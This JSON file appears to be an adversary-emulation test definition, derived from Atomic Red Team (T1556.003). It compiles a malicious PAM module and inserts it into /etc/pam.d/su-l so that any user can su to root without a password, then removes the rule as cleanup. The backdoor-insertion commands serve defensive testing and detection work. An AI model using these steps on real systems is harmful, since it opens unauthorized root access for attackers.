{
  "id": "65208808-3125-4a2e-8389-a0a00e9ab326",
  "name": "Malicious PAM module",
  "description": "Creates a PAM module, inserts a rule to use it, and then tests it.\n\nUpon successful execution, this test will create a PAM module that allows every user to su to root without a password.\n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "b76a98db-3e7b-471a-9cb0-d99908585b88",
      "type": "execute-command",
      "data": {
        "command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "31570e36-c631-4d6f-b184-5943cf822c13",
      "type": "execute-command",
      "data": {
        "command": "sudo sed -i \"\\,#{pam_rule},d\" #{path_to_pam_conf}\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "3278e286-d5e8-4bb2-a5a1-3f72186ef184",
      "name": "Check dependency 1/2",
      "description": "The PAM development library must be installed to build the PAM module\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -f /usr/include/security/pam_modules.h ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "3a4d6294-e3b0-4706-b23a-4f01e7e3419f",
      "name": "Resolve dependency 1/2",
      "description": "The PAM development library must be installed to build the PAM module\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n \"`which yum`\" ]; then sudo yum -y install pam-devel; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "2647738d-fd3a-4631-b625-3a6c61ca142d",
      "name": "Re-check dependency 1/2",
      "description": "The PAM development library must be installed to build the PAM module\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -f /usr/include/security/pam_modules.h ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7f0d64fc-02f9-4d59-a35d-727a80eb519a",
      "name": "Check dependency 2/2",
      "description": "The PAM module must exist on disk at specified location (#{path_to_pam_module})\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "e01fcf99-a428-442e-a249-95bdb5bbbf3c",
      "name": "Resolve dependency 2/2",
      "description": "The PAM module must exist on disk at specified location (#{path_to_pam_module})\n",
      "type": "execute-command",
      "data": {
        "command": "sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "3deee4d5-6937-4761-8471-fc7e218707d8",
      "name": "Re-check dependency 2/2",
      "description": "The PAM module must exist on disk at specified location (#{path_to_pam_module})\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "b76a98db-3e7b-471a-9cb0-d99908585b88",
      "p": "on-success",
      "o": "31570e36-c631-4d6f-b184-5943cf822c13"
    },
    {
      "s": "b76a98db-3e7b-471a-9cb0-d99908585b88",
      "p": "on-failure",
      "o": "31570e36-c631-4d6f-b184-5943cf822c13"
    },
    {
      "s": "3278e286-d5e8-4bb2-a5a1-3f72186ef184",
      "p": "on-success",
      "o": "b76a98db-3e7b-471a-9cb0-d99908585b88"
    },
    {
      "s": "3278e286-d5e8-4bb2-a5a1-3f72186ef184",
      "p": "on-failure",
      "o": "3a4d6294-e3b0-4706-b23a-4f01e7e3419f"
    },
    {
      "s": "3a4d6294-e3b0-4706-b23a-4f01e7e3419f",
      "p": "on-success",
      "o": "2647738d-fd3a-4631-b625-3a6c61ca142d"
    },
    {
      "s": "2647738d-fd3a-4631-b625-3a6c61ca142d",
      "p": "on-failure",
      "o": "b76a98db-3e7b-471a-9cb0-d99908585b88"
    },
    {
      "s": "7f0d64fc-02f9-4d59-a35d-727a80eb519a",
      "p": "on-success",
      "o": "b76a98db-3e7b-471a-9cb0-d99908585b88"
    },
    {
      "s": "7f0d64fc-02f9-4d59-a35d-727a80eb519a",
      "p": "on-failure",
      "o": "e01fcf99-a428-442e-a249-95bdb5bbbf3c"
    },
    {
      "s": "e01fcf99-a428-442e-a249-95bdb5bbbf3c",
      "p": "on-success",
      "o": "3deee4d5-6937-4761-8471-fc7e218707d8"
    },
    {
      "s": "3deee4d5-6937-4761-8471-fc7e218707d8",
      "p": "on-failure",
      "o": "b76a98db-3e7b-471a-9cb0-d99908585b88"
    }
  ],
  "tags": [
    "T1556.003",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "index",
      "type": "integer",
      "description": "Index where the rule is inserted.",
      "value": "1"
    },
    {
      "name": "path_to_pam_module_source",
      "type": "path",
      "description": "Path to PAM module source code.",
      "value": "PathToAtomicsFolder/T1556.003/src/pam_evil.c"
    },
    {
      "name": "path_to_pam_module",
      "type": "path",
      "description": "Path to PAM module object",
      "value": "/tmp/pam_evil.so"
    },
    {
      "name": "path_to_pam_conf",
      "type": "string",
      "description": "PAM config file to modify.",
      "value": "/etc/pam.d/su-l"
    },
    {
      "name": "pam_rule",
      "type": "string",
      "description": "Rule to add to the PAM config.",
      "value": "auth sufficient /tmp/pam_evil.so"
    }
  ]
}